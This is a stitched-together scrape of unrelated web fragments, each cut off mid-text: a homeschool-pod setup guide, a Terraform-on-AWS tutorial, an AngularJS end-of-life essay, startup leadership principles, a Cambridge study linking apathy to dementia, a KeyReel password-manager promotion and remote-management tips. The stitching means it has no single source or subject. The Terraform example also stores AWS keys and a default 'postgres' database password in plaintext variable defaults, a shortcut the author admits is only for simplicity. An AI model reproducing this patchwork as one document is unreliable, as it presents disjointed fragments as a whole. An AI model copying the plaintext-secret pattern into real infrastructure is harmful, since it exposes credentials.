generally won’t cost more than $200/year. It costs about $50 to run a background check on the leader of your group. Curriculum can range from $20 to $500 for the whole group for the whole year. There is plenty of free and discounted curriculum in homeschool groups.&nbsp;</p></li></ul><ul data-rte-list="default"><li><p><strong>Pick a location: </strong>Decide if you want this to take place outside, at your house, at a teacher’s home or alternate homes. For health reasons, for consistency and also for setting up an environment conducive to learning, I recommend not swapping homes, but many have done it with success.&nbsp;<br></p></li><li><p><strong>Make sure you are following childcare and schooling laws in your state: </strong>Generally two children can be considered a license-exempt childcare. However, if you are over age 6, you will generally have to file as a homeschooler or be enrolled in some type of school.  Remember that you have a constitutional right to educate your child as you see fit, but there may be specific guidelines in some states regarding how many children can gather with a paid caregiver or teacher. <a href="https://www.withprimer.com/">Primer</a> has a state-by-state homeschool regulations navigator that you can use.  If your child is under 5, check <a href="https://www.noodle.com/articles/l/preschool-how-preschool-works-by-state">Noodle’s</a> state by state guide for preschool laws. You can also contact your department of education or child care services for more information. We are also happy to help you find the right information for your state, as these laws can sometimes be confusing and even contradictory!</p></li></ul><ul data-rte-list="default"><li><p><strong>Write a one paragraph post:</strong> Come up with one paragraph you can post to social media that includes a little bit about your family, your vision for the program, schedule, ages and your general location that you can use to post to parent groups looking for a teacher, caregiver or other families.&nbsp;</p></li></ul><p><strong>Step 2. Find a teacher&nbsp;&nbsp;</strong></p><p>Once you’ve figured out what you want and how much you’re willing to pay, you can start looking for a teacher. If you already have a nanny or caregiver or family watching your child, they can absolutely be the leader of the group. I’ve found the best place to find teachers and caregivers is local facebook parenting groups.&nbsp; Other place to find teachers include babysitting sites like care.com or urban sitter …</p></div></div></div>

<!-- Horizontal Top Article -->
<p>Terraform, this is my little treat of the moment. We have to talk about it. With the explosion of the DevOps movement in recent years, infrastructure-as-code has become a must. And <strong>Terraform is the cool kid</strong> in this field.</p>



<h3>Once upon a time</h3>



<p>In the beginning of 2006, Amazon announced a slightly known service suite : <strong><a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://aws.amazon.com/" target="_blank" rel="noreferrer noopener">Amazon Web Service (AWS)</a></strong>. Heard about it ? </p>



<p>On August 25 of the same year, <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://aws.amazon.com/ec2/" target="_blank" rel="noreferrer noopener">EC2</a> is launched in beta in the United States. <strong>For the first time, developers can launch an on-demand server in the cloud within minutes.</strong> One year later, the service is publicly open worldwide. This was about to change everything.</p>



<p>You have to understand that before this revolution, having a server for your app was pretty much hell. It took a request to the infrastructure service in your company. You had to wait during the manual creation of a physical server that would not move anymore.</p>



<p>Right now, you create, modify and destroy your server in a few clicks. <strong>Almost instantaneously.</strong> And that’s all good and well, but it’s not enough for total control.</p>



<figure><img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20210%20140%22%3E%3C/svg%3E" data-src="https://64.media.tumblr.com/5057c3b4ed0c39339a52e53b21db0208/tumblr_oo2v0z9EXo1uerxcio1_500.gif" alt=""></figure>



<p><strong>What if you could, via your code, dynamically create and manage your infrastructure in a cloud service ?</strong> Amazon likes the idea so much that on May 15, 2010 they announce <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://aws.amazon.com/cloudformation/" target="_blank" rel="noreferrer noopener">CloudFormation</a>. </p>



<p><strong>Infrastructure as a service was born and it was going to give a lot of people a lot of pleasure.</strong> The most talked about IaC tool at the moment is the subject today. Terraform.</p>



<h3>What’s Terraform?</h3>



<p><strong>Terraform is an infrastructure tool as code.</strong> It is open source and written in Go by <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://www.hashicorp.com/" target="_blank" rel="noreferrer noopener">Hashicorp</a>. Concretely, it allows you to declare, via code, what you want for your infrastructure. In structured configuration files you will be able to manage your infrastructure automatically without manual action. <strong>Whether it’s the initial provisioning, the update or the destruction of your infrastructure, it’s your code that drives everything.</strong></p>



<p>In the world of infra-as-code you have several ways of doing things.<strong> Terraform goes for the so-called declarative way of doing things. </strong>You declare in your configuration files the desired state of your infrastructure. Terraform will only do the minimum to achieve the desired state.</p>



<p><strong>Example</strong>: your live infrastructure already has a web server and a database running. Your config in your code corresponds perfectly to this. Then you add in your configuration that finally you want two databases. When you commit, Terraform will create an additional database and do nothing else. <strong>It has reached the desired state declared by your code.</strong> This is beautiful when you see it.</p>



<figure><img src="https://i.imgur.com/yqLZ6hp.jpg" data-src="https://i.imgur.com/yqLZ6hp.jpg" alt=""></figure>



<p>It’s beautiful because it means you can see and understand your infrastructure by only looking at your code. Code which is versioned via git ! Your infra is versioned. </p>



<p><strong>Since it’s code, you can use it to test in several environments before production.</strong> Push the same code in a dev environment and you can test changes in a safe way. You can check the status of your infra in code review with your colleagues. You can iterate quickly and make important changes by changing a few lines. In short, it’s paradise for the DevOps way of doing things.</p>



<p>But how does it actually work? How does Terraform manage to create, modify and destroy your infrastructure via a piece of config?</p>



<h3>How does it work?</h3>



<p>Terraform will take the state you declared in your configuration files and push the changes to the destination provider. Let’s imagine, you want to create a server on AWS. You declare it, you push it and poof your server appears in your AWS account.</p>



<p><strong>What happened under the engine is that Terraform used the <a href="https://docs.aws.amazon.com/sdk-for-go/api/" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">AWS SDK written in Go</a></strong>. Via this SDK it created your server directly on the cloud. But you don’t have to bother with the SDK code or really understand what’s going on behind it. <strong>Terraform takes care of its shit and you take care of your code.</strong> This makes the infrastructure update flow very simple and very fast for you.</p>



<div><figure><img src="https://i.imgur.com/6zpK45F.jpg" data-src="https://i.imgur.com/6zpK45F.jpg" alt=""></figure></div>



<p>And the thing is that Terraform is not limited to one provider (AWS) or the Cloud in general. <strong>Almost any type of infrastructure can be represented as a resource in Terraform.</strong> Whi is CRAZY when you think about it !</p>



<p>From <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://www.terraform.io/docs/providers/docker/index.html" target="_blank" rel="noreferrer noopener">docker containers</a> on your local machine to your cloud account on <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://www.terraform.io/docs/providers/do/index.html" target="_blank" rel="noreferrer noopener">DigitalOcean</a>, you can reproduce your infrastructure everywhere. <strong>I’m not going to give you the whole list of possible providers, <a href="https://www.terraform.io/docs/providers/index.html" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">it’s all over the place</a>.</strong> And that makes Terraform even more beautiful. </p>



<p>Okay, enough with the theory, let’s get our hands in there.</p>



<h3>Show me the code</h3>



<p>Let’s start by setuping everything. <strong>I’m assuming you’re using a holy Linux distribution.</strong> If you’re not, <a href="https://learn.hashicorp.com/terraform/getting-started/install.html" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">you can look over there</a>.</p>



<pre data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># dependencies
sudo apt-get install wget unzip

# download last version
wget https://releases.hashicorp.com/terraform/0.12.20/terraform_0.12.20_linux_amd64.zip

# unzip in bin folder
sudo unzip ./terraform_0.12.20_linux_amd64.zip -d /usr/local/bin/

# check its working
terraform -v</pre>



<p>Now we’re going to write our first configuration file. <strong>Let’s do something simple: we’re going to create an EC2 server and a Postgres database on AWS.</strong> I’m assuming you also have an AWS account with admin credentials. First step, we’ll create a main.tf file where we’ll simply define our provider.</p>



<p><strong>main.tf</strong></p>



<pre data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># definition provider
provider "aws" {
  version = "~&gt; 2.0"
  region = "${var.provider_region}"
  access_key = "${var.secret_access_key}"
  secret_key = "${var.secret_key}"
}</pre>



<p><strong>Here we simply saying that we want to work on AWS and choose our version and region. </strong>To access AWS we specify the credentials. They are referenced via a variable system. These variables are all stored in a file that we will see later.</p>



<p>Now that we have declared the destination, we will declare what we want to create. As usual, when we don’t know where to start, <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://www.terraform.io/docs/providers/aws/r/instance.html" target="_blank" rel="noreferrer noopener">we look at the doc</a>. Let’s create a resource.tf file where we declare an Ubuntu machine and a Postgres database.</p>



<p><strong>resource.tf</strong></p>



<pre data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">resource "aws_instance" "web" {
  ami = "${data.aws_ami.ubuntu.id}"
  instance_type = "${var.server_instance_type}"

  tags = {
    Name = "${var.server_tag_name}"
  }
}

data "aws_ami" "ubuntu" {
  most_recent = true

  filter {
    name = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-trusty-14.04-amd64-server-*"]
  }

  owners = ["099720109477"]
}

resource "aws_db_instance" "default" {
  allocated_storage = "${var.db_allocated_storage}"
  storage_type = "${var.db_storage_type}"
  engine = "${var.db_engine}"
  engine_version = "${var.db_engine_version}"
  instance_class = "${var.db_instance_class}"
  name = "${var.db_database_name}"
  username = "${var.db_database_username}"
  password = "${var.secret_db_database_password}"
  final_snapshot_identifier = "${var.db_snapshot_identifier}"
}</pre>



<p>Now that we’ve defined everything we wanted, we’re going to fill all this in with the corresponding variables. <strong>We create a variables.tf file dedicated to that.</strong> Note that secrets should never be in clear text in a file but for simplicity, we’ll do it like this.</p>



<pre data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># provider variables
variable "provider_region" {
 description = "Provider region"
 default = "us-east-1"
}

variable "secret_access_key" {
 description = "Provider access key"
 default = "YOUR-ACCESS-KEY"
}

variable "secret_key" {
 description = "Provider secret key"
 default = "YOUR-SECRET-KEY"
}

# instance web variables
variable "server_instance_type" {
  description = "Server instance type"
  default = "t2.micro"
}

variable "server_tag_name" {
  description = "Server tag name"
  default = "JeSuisUnDev"
}

# instance base de données RDS postgres variables
variable "db_allocated_storage" {
  description = "Allocated storage"
  default = 20
}
variable "db_storage_type" {
  description = "Storage type"
  default = "gp2"
}

variable "db_engine" {
  description = "Storage engine"
  default = "postgres"
}

variable "db_engine_version" {
  description = "Storage engine version"
  default = "11.5"
}

variable "db_instance_class" {
  description = "Storage instance class"
  default = "db.t2.micro"
}

variable "db_database_name" {
  description = "Storage database name"
  default = "postgres"
}

variable "db_database_username" {
  description = "Storage database name"
  default = "postgres"
}

variable "secret_db_database_password" {
  description = "Storage database secret password"
  default = "postgres"
}

variable "db_snapshot_identifier" {
  description = "Storage database snapshot identifier"
  default = "postgres"
}</pre>



<p>There you go! End of configuration! It’s time to test it all. To do that, we’re going to go in stages. F<strong>irst we’ll initialize Terraform, validate our files, plan our actions and finally apply our changes.</strong> Let’s use the Terraform CLI!</p>



<div><figure><img src="https://i.imgur.com/DDK9Dvy.jpg" data-src="https://i.imgur.com/DDK9Dvy.jpg" alt=""></figure></div>



<p>Let’s start by typing the Terraform <strong>initialization </strong>command. This has to be done in the current folder where you created the previous files.</p>



<pre><code>&gt; terraform init

Initializing the backend...

Initializing provider plugins...
- Checking for available provider plugins...
- Downloading plugin for provider "aws" (hashicorp/aws) 2.48.0...

Terraform has been successfully initialized!</code></pre>



<p>We validate that everything is fine in our configuration.</p>



<pre><code>&gt; terraform validate

Success! The configuration is valid.</code></pre>



<p>Then we plan our next move. We should only have create operations to do since we’re on an new infra.</p>



<pre><code>&gt; terraform plan

An execution plan has been generated and is shown below.
Resource actions are indicated with the following symbols:
  + create

Terraform will perform the following actions:

  # aws_db_instance.default will be created
  # aws_instance.web will be created

Plan: 2 to add, 0 to change, 0 to destroy.</code></pre>



<p>And now, the fateful moment that makes all the magic of this kind of tool. <strong>We’re going to apply the Terraform plan.</strong> It’s going to actually create our infrastructure in the cloud.</p>



<pre><code>&gt; terraform apply

aws_instance.web: Creating...
aws_db_instance.default: Creating...
aws_instance.web: Still creating... [10s elapsed]
aws_instance.web: Still creating... [30s elapsed]
aws_instance.web: Creation complete after …</code></pre></div></div>

As a&nbsp;response, trade magazines and blogs <a href="https://www.convective.com/angularjs-end-of-life/">lamented AngularJS’s end of life</a>. <a href="https://github.com/angular/angular.js/issues/16895">Developers questioned Google</a> about the security ramifications. Excellent guides <a href="https://justcoded.com/blog/moving-from-angularjs-to-angular-the-overview-of-the-two-frameworks/">appeared on how to transition from AngularJS to Angular</a>. In 2016, AngularJS <a href="https://www.softwebsolutions.com/resources/why-angularjs-is-popular-among-enterprises.html">was the most popular JavaScript framework</a>. How many development hours and dollars will be spent making this transition? <b>Is it even necessary?</b></p>
<p>There is a&nbsp;beautiful fact about open source: <b>An open source project is “dead” only when no one is willing to keep it alive.</b></p>
<ul>
<li>Do you need Java 8? While Oracle won’t support it without a&nbsp;commercial license, Red Hat supports <a href="https://developers.redhat.com/products/openjdk/download">OpenJDK 8</a> and Amazon created the <a href="https://docs.aws.amazon.com/corretto/latest/corretto-8-ug/downloads-list.html">Corretto 8&nbsp;project</a> to keep Java 8&nbsp;projects going.</li>
<li>Do you still need Python 2? Though Python 3&nbsp;came out in 2008, it took 12 years to officially discontinue version 2. But if you still need it, <a href="https://www.infoworld.com/article/3194915/python-2-forever-3-projects-that-will-keep-python-2-alive.html">there are multiple projects, including Tauthon,</a> that keep it alive.</li>
<li>Unhappy that Debian uses systemd instead of sysvinit? Switch to <a href="https://devuan.org/">Devuan</a>!</li>
</ul>
<p>AngularJS has <a href="https://github.com/angular/angular.js/">28,700 forks and 77 active pull requests on GitHub</a> (as of July 2020). With the number of projects and corporate investment in AngularJS, what is the probability that there won’t be a&nbsp;community to step up and keep it going?</p>
<p>Open source frameworks give us the opportunity to create architectures that can last for decades. By choosing an open technology that is immensely popular, we increase the chance that an active community will keep it alive. Even if the community disappears, because we have the source code <b>we can maintain it ourselves</b> if it makes sense from a&nbsp;return on investment perspective.</p>
<p>Last month, the XLTS.dev team <a href="https://angularjs.xlts.dev/">announced “Extended Long Term Support” for AngularJS</a>. To paraphrase Mark Twain, I&nbsp;believe that <a href="https://www.mentalfloss.com/article/562400/reports-mark-twains-quote-about-mark-twains-death-are-greatly-exaggerated">the reports of AngularJS’s death are greatly exaggerated</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>Over the course of the past few years running my startup, it’s almost ludicrous just how much I’ve learnt. From how to turn a coffee-table conversation into a working product, a product into a scalable venture, scalable venture into multi-million dollar funding rounds, etc.</p><p>But no single area of learning has been as valuable, scalable or effective as the knowledge of how to manage a team. As soon as you have more than one person working on something the dynamic shifts completely  —  in ways that are hard to quantify from the outset no matter how prepared you think you are.</p><p>It’s a strange phenomenon, since usually you’re hiring someone to fill a gap that you desperately need sealed. Or to pick up some slack that you simply cannot straighten out yourself. </p><p>But no matter what, scaling from a solo-operator, or solo-engineer/designer/salesperson to a “team” requires a change in process, clarity and, most importantly, <strong>your own psychology</strong>.</p><p>As a matter of fact, one could make a compelling case that learning how to manage a team is actually an exercise in learning how to manage oneself &nbsp;first  —  and as an extension, others.</p><p>No longer can you (or should you) see yourself as the “hero”, the builder of the product, the linchpin of the organization. You’re now forced to see yourself as a curator of talent, a facilitator of alignment and collaboration, a guiding light when there is encroaching darkness and a steady hand on the rudder when seas get rough.</p><p>The following are a collection of principles I have leaned on and continue to lean on, refine, and adapt to the changing environment. Some of them may be bullshit, others may be timeless. That’s besides the point. </p><p>The main goal is to put them down for myself, for accountability, for updating, and in the off-chance that they prove useful to others who happen to stumble upon.</p><p>‍</p><h3>TL;DR&nbsp;Quick List Of Principles. Click to scroll.</h3><ol start="1" role="list"><li><a href="#1">People are most often looking for either guidance or confirmation i.e. “Ask before answering”.</a></li><li><a href="#2">Always apologize first, or make it clear you won’t i.e. “Limbo Kills”.</a></li><li><a href="#3">Respect and love define a leader  —  not age, experience, title or role.</a></li><li><a href="#4">Don’t equate long work for hard work.</a></li><li><a href="#5">In times of conflict  —  breathe, empathize, return.</a></li><li><a href="#6">Before you can win, you have to make sure everyone is playing the same game.</a></li><li><a href="#7">Things don’t gain importance by words, they gain importance by actions alone.</a></li><li><a href="#8">Simplicity is not always the goal, complexity is not always the answer</a></li><li><a href="#9">No management book will ever teach you the real thing. Learn by doing and use knowledge to avoid mistakes.</a></li></ol><p>‍</p><p>‍</p><h3>1. People are most often looking for either guidance or confirmation i.e. “Ask before answering”.</h3><p>Most people (myself included), though they’d be chaste to admit it, have very high opinions of their own thoughts and decisions. It can be all too easy to fall in love with the sound of your own voice without understanding just what it is that others are looking for. </p><p>In most cases people are listening to you to be polite  —  there are exceptions of course. But in a majority of cases I’ve found that people are looking for one of two things  —  <strong>guidance</strong> or <strong>confirmation</strong>.</p><p>There are different strategies for dealing with either scenario but the main principle here is to understand which situation you are in. The way you respond to someone looking for confirmation, who has already made up their mind, ought to be vastly different than those who need your expertise and advise.</p><p>It’s not that you should always agree with their decision, not at all, but if you don’t understand that confirmation is what the person is looking for and you begin offering them guidance it’s all too common for your words to fall on deaf ears.</p><p>Know which game you are going to play before you prance on the field.</p><p>‍</p><h3>2. Always apologize first, or make it clear you won’t i.e. “Limbo Kills”.</h3><p>The worst thing that can happen between two team members is <strong>not</strong> conflict —  that’s actually relatively easy to deal with. Usually stemming from miscommunication, talking past each other or — on rare occasions — toxic personalities, conflict tends to lend itself well to mediation.</p><p>Situations with conflict also have the added benefit that they are either solvable (a misunderstanding/miscommunication) or unsolvable (fundamental philosophical differences) and you can move on once you understand which is which.</p><p>But back to the original point, the <strong>actual </strong>worst thing for relationships within a team is <strong>uncertainty</strong>. </p><p>When I don’t know where you stand and you don’t know where I stand then we end up at an impasse that kills creativity and collaboration like no other. This is especially true in small, close knit teams.</p><p>If I’m in my corner expecting you to acknowledge my position and apologize to me and meanwhile you are huddled in yours, nothing gets done. Tensions flare. Feelings get hurt. Work becomes a chore, life gets hard.</p><p>On the flip side if you’re clear in your actions  —  <em>“I’m sorry, I don’t know if this was entirely my fault but I know there are things I could have done better and I apologize”</em> or <em>“I am not going to apologize as I believe strongly in X, Y Z”</em>.</p><p>Either of these two sentiments brings clarity to the situation. It’s quite possible or probably that someone might not agree, but it removes the tension of uncertainty and either shifts the situation more towards empathy and understanding or towards fundamental conflict  —  which as I mentioned before, is actually preferable to uncertainty.</p><p>Limbo kills relationships, partnerships, businesses, and probably house plants. Don’t allow any room for it in the culture you build.</p><p>‍</p><h3>3. Respect and love define a leader  —  not age, experience, title or role.</h3><p>Leadership is the process of helping others realize their own potential. It's about providing support, direction, assistance (when needed)&nbsp;and having the insight to know when to <strong>keep your mouth shut</strong>,</p><p>While strategies, tactics, styles and more vary the one thing that does not is the notion that leadership transcends surface level properties. The same way we don't associate eye color, hair, height, or weight with leadership ability, we should also be careful to attribute age, experience, title or role to the same.</p><p>While it may be true that most people don't rise to the level of their expectation but fall to the level of their training, where that level of expectation is in the first place will determine how far and deep the fall. The higher you set the expectation, the higher the eventual outcome. People are malleable and have the potential for infinite change, thus putting bounds on growth based on superficial characteristics holds an organization back more than anything else.</p><p>A&nbsp;leader is not defined by these characteristics but should rather be defined by the <strong>respect</strong> and <strong>love</strong> of the people they lead. While bringing love into a business context is not a normal thing to do, stories like that of Herb Kelleher ("A company is stronger if it is bound by <strong><em>love</em></strong> rather than by fear.") give us indication that the sterile, emotionless bubble business has long been associated with may not be the most effective way to go.</p><p>Measure yourself by respect and love and your team, your company, and maybe someday even the world, will thank you for it.</p><p>‍<br></p><h3>4. Don’t equate long work for hard work.</h3><p>Long work usually means inefficient process, unrefined planning or lack of understanding the true goal. Of course sometimes with deadlines and the grind of a startup long hours are unavoidable, but in general long does not mean hard (at least, well, not in this context) and sometimes 4 hours of focused, primed, <strong>hard </strong>work can beat 12 hours of unfocused muddling.</p><p>The other important things here is to never expect your team to work more than you do and to not hold people to a standard of working insane hours. Hours do not prove loyalty, they do not prove respect and they do not prove buy-in to the mission. </p><p>Asking people to go above and beyond should be a tool that’s used only when it’s needed and therefore a tool that should barely be used at all because at the end of the day building a lasting business is a marathon, not a sprint, and as a marathon runner I can safely say that <strong>pacing</strong>. <strong>is</strong>. <strong>everything</strong>.</p><p>‍</p><h3>5. In times of conflict  —  breathe, empathize, return.</h3><p>As a recovering hot head, dealing with conflict maturely and in a matter that de-escalates the situation has never been my strong suit. I’ve had to discover strategies the hard way and have collected advice the easy way all of which effectively come back to the same thing — <strong>add an interrupt</strong>.</p><p>Moments of passion rarely lead to positive outcomes (in this context, at least) so the rule of backing up, breathing (6 deep breaths, lowering that blood pressure), trying to empathize with the person (or people) on the other end, and then coming back to the situation helps almost <strong>every time.</strong></p><p>A thoughtless Slack message can be just as damaging to a relationship as a rude comment or public shaming, so adding a pattern interrupt is crucial to avoid putting your foot in your mouth as much as humanly possible.</p><p>‍</p><h3>6. Before you can win, you have to make sure everyone is playing the same game.</h3><p>A company is nothing more than a loose organization of people working towards the same goal. But if there is any crack in this shared reality, any fuzz in this vision of the future that you are working towards, then it becomes difficult to move forward quickly or effectively.</p><p>It’s difficult to win if you’re not playing the same game and impossible to play unless you’re all on the same field. Err towards <strong>oversharing</strong> and <strong>over-communicating</strong>, especially when it comes to things like mission, vision, culture and roadmap.</p><p>As the saying goes, <em>“If you want to build a ship, don’t drum up the men to gather wood, divide the work, and give orders. Instead, teach </em><strong><em>them</em></strong><em> to </em><strong><em>yearn</em></strong><em> for the vast and endless </em><strong><em>sea</em></strong><em>.” </em>It’s the job of a leader to set priorities and to cultivate that yearning by making sure each and every person with you has the same image of the endless sparkling water just beyond their reach.</p><p>‍</p><h3>7. Things don’t gain importance by …</h3></div></div></div></div></div>

SVD may occur in one out of three elderly individuals, causes about a quarter of all strokes, and is the most common cause of vascular dementia.</p><p>The team studied two independent cohorts of SVD patients, one from the UK and the other from the Netherlands.* Across both cohorts, they found that individuals with higher baseline apathy, as well as those with increasing apathy over time, had a greater risk of dementia. In contrast, neither baseline depression nor change in depression had any detectable influence on dementia risk.</p><p>These findings were consistent despite variation in the severity of participants’ symptoms, suggesting that they could be generalised across a broad spectrum of SVD cases. The relationship between apathy and dementia remained after controlling for other well-established risk factors for dementia including age, education, and cognition.</p><p>Lead author, Jonathan Tay, from Cambridge’s Department of Clinical Neurosciences said: “There has been a lot of conflicting research on the association between late-life depression and dementia. Our study suggests that may partially be due to common clinical depression scales not distinguishing between depression and apathy.”</p><p>Apathy, defined as a reduction in ‘goal-directed behaviour’, is a common neuropsychiatric symptom in SVD, and is distinct from depression, which is another symptom in SVD. Although there is some symptomatic overlap between the two, previous MRI research linked apathy, but not depression, with white matter network damage in SVD.</p><p>Jonathan Tay said: “Continued monitoring of apathy may be used to assess changes in dementia risk and inform diagnosis. Individuals identified as having high apathy, or increasing apathy over time, could be sent for more detailed clinical examinations, or be recommended for treatment.”</p><p>Over 450 participants - all with MRI-confirmed SVD - recruited from three hospitals in South London and Radboud University’s Neurology Department in the Netherlands, were assessed for apathy, depression and dementia over several years.</p><p>In the UK cohort, nearly 20% of participants developed dementia, while 11% in the Netherlands cohort did, likely due to the more severe burden of SVD in the UK cohort. In both datasets, patients who later developed dementia showed higher apathy, but similar levels of depression at baseline, compared to patients who did not.</p><p>The study provides the basis for further research, including the mechanisms that link apathy, vascular cognitive impairment, and dementia. Recent MRI work suggests that similar white matter networks underlie motivation and cognitive function in SVD. Cerebrovascular disease, which can be caused by hypertension and diabetes, can lead to network damage, resulting in an early form of dementia, presenting with apathy and cognitive deficits. Over time, SVD-related pathology increases, which is paralleled by increasing cognitive and motivational impairment, eventually becoming severe enough to meet criteria for a dementia state.</p><p>Jonathan Tay says: “This implies that apathy is not a risk factor for dementia per se, but rather an early symptom of white matter network damage. Understanding these relationships better could have major implications for the diagnosis and treatment of patients in the future.”</p><p>–</p><p><i>This article is republished from the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.cam.ac.uk%2F&amp;t=ZTk4NDQxMGYwMWI1YjBlM2U5NDg5NTg0ZGU3MDU3Mzc5NGEyMWZhMyxtN1YxVUl0Ng%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F623746641320624128%2Flink-between-dementia-and-apathy&amp;m=0">University of Cambridge</a> under a Creative Commons license.

  <div><p>
Why do we continue to reuse passwords, use short, easy-to-guess combinations, and save them on our desktops rather than use password managers? The answer lies in the nature of passwords themselves.</p><p>

While they’re a necessary measure we take keep valuable information safe online, passwords also act as “speed bumps” disrupting the flow of the online experience. And the fact is, many of us would rather compromise on security than convenience...<br>
As dangerous as that is, the alternative - entering a master password every time we log in using a high-security password manager - takes too great a toll on our online experience. The ease - and vulnerability - of weak and multiple-account passwords, insecure browser password managers, or cloud server-based password managers that have been hacked in the past becomes nearly impossible to resist.</p><p>

So the passwords we create leave us vulnerable, our online experience is riddled with inconvenience, and the password managers that are easiest to use are vulnerable themselves.</p><p>

As software engineers with cybersecurity expertise in Seattle, we understand that in order to be effective, password security needs to be both practical and trustworthy enough for users to actually stick with it. We aimed to build the best tool for the job when we developed <a href="https://www.keyreel.io/index.html?utm_source=blog.keyreel.io&amp;utm_medium=article&amp;utm_campaign=180501" target="_blank">KeyReel Security Assistant</a>.</p><p>

KeyReel provides the awesomeness of autologin, keeps credentials safely offline, and avoids the inconvenience of frequent master password entry... without the use of a cloud server. It’s high-security password management everyone actually enjoys, and we’re relaunching it publicly today.</p><p>

Far more secure than the typical laptop, when a user installs KeyReel the phone, it becomes the perfect portable password notebook where all passwords are stored offline in a single encrypted vault. But the magic lies in its pairing with the Mac or PC via encrypted Bluetooth connection.</p><p>

KeyReel senses when a user browses to a login screen and instantly transfers the appropriate AES-encrypted credentials from the phone directly to the browser. And when the user picks up the phone and leaves the computer behind, the Bluetooth connection breaks once out of range, but credentials stay offline with its owner. It’s the keyless entry experience of a luxury car, for the internet - but much safer.</p><p>

We designed KeyReel so users will never have to enter a master password again. But for certain sites, two or more authentication factors are always better than one. Rather than SMS, the phone’s TouchID or PIN code can allow KeyReel to provide a further layer of protection when a user logs in to banking, e-commerce, and other sites where critical personal data is stored.</p><p>

And no matter what happens to the phone, password data remains encrypted and inaccessible without a Bluetooth connection to the computer KeyReel is paired with. If a user sets up a backup password vault on their Mac or PC, KeyReel’s password data will be available to use on the new phone, too.</p><p>

A strong, unique password can take today’s fastest machines years to decode. It’s the best defense we have against hackers, viruses, identity theft, and spying - even better than biometric authentication. Since we believe everyone should be able to easily marshall that defense and prevent nearly all attempts to get around it, KeyReel is also completely free.</p><p>

Feedback from our beta users and early adopters has shaped KeyReel throughout its development, and with our relaunch, we welcome even more.</p><p>

Anyone with a laptop and an phone can join the growing number of people who use KeyReel to enjoy the freedom of browsing in comfort and security right now - and spread the word. Now’s also the time to sign up to be the first to know when KeyReel for Android is released, which will be soon. Together, we’re going to change the world of personal password management for the better, the safer, and the simpler.

<p><span><span>A</span> necessity for companies across the globe, there are thousands of managers who face the challenge of managing remote teams for the first time today.</span></p>
<p><span>It can be an overwhelming experience for the first time remote managers to manage and adapt to lifestyle changes too, along with changes at work.</span></p>
<p><span>Especially with regards to work, your equations with your team is bound to change as they now work remotely.</span></p>
<p><span>You have the responsibility of managing them efficiently, without seeing them.</span></p>
<p><span>That sounds a bit strange right, but it is true!</span></p>
<p><span>Your success in managing your new remote team will decide what would be the future of your company, whether it would be</span><a href="https://www.peoplebox.ai/blog/remote-first-vs-remote-friendly-companies-whats-the-difference/"> <span>remote-first or remote-friendly</span></a><span> or go back to being a regular in-office setup.</span></p>
<p><span>We have pulled together simple 11 tips to streamline your work process and develop an efficient workflow that will help you power up you and your team’s productivity as you step up in this new role of <a href="https://www.peoplebox.ai/blog/how-to-manage-remote-employees-effectively/">remote management</a>.</span></p>

<h2>11 tips for first time remote managers</h2>
<h3><span><span>1</span></span>Embrace the change</h3>

<div>
<p><strong>A <a href="https://buffer.com/state-of-remote-work-2019">study</a> in 2019 observed that 99 percent of employees almost unanimously wanted to continue to work remotely (or at least for some of the time) for the rest of their careers.</strong></p>

</div>

<p><span>This means that as a leader who now must manage a team whether big or small, from a remote location, it is crucial that you showcase a positive attitude towards the situation so that your team can follow the same.</span></p>
<p><span>More so, since a lot of team members might already be excited about the change and who can further help in boosting the team’s morale.</span></p>
<p><span>Highlighting the benefits of remote working, having an open communication strategy with the team, creating transparent processes that streamline work, etc. can </span><a href="https://www.peoplebox.ai/blog/transitioning-to-remote-work-heres-what-you-should-know-as-a-manager/"><span>help your team to embrace this change</span></a><span> that is here to stay.</span></p>
<p><span>It is also advisable to make use of the right technology to familiarize yourself with remote work requirements and remote working etiquettes and set an example for the team.</span></p>
<h3><span><span>2</span></span>Be empathetic</h3>

<p><img src="https://www.peoplebox.ai/wp-content/uploads/2020/06/5436-scaled.jpg" alt="talk to team members regularly" width="2560" height="1707" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/06/5436-scaled.jpg 2560w, https://www.peoplebox.ai/wp-content/uploads/2020/06/5436-300x200.jpg 300w, https://www.peoplebox.ai/wp-content/uploads/2020/06/5436-1024x683.jpg 1024w, https://www.peoplebox.ai/wp-content/uploads/2020/06/5436-768x512.jpg 768w, https://www.peoplebox.ai/wp-content/uploads/2020/06/5436-1536x1024.jpg 1536w, https://www.peoplebox.ai/wp-content/uploads/2020/06/5436-2048x1365.jpg 2048w" sizes="(max-width: 2560px) 100vw, 2560px"></p>

<p><span>Being an empathetic manager was always important, whether your work took place remotely or in an office.</span></p>
<p><span>Given today’s uncertain economic environment, empathy is more important than ever since a lot of team members are juggling work and family commitments.</span></p>
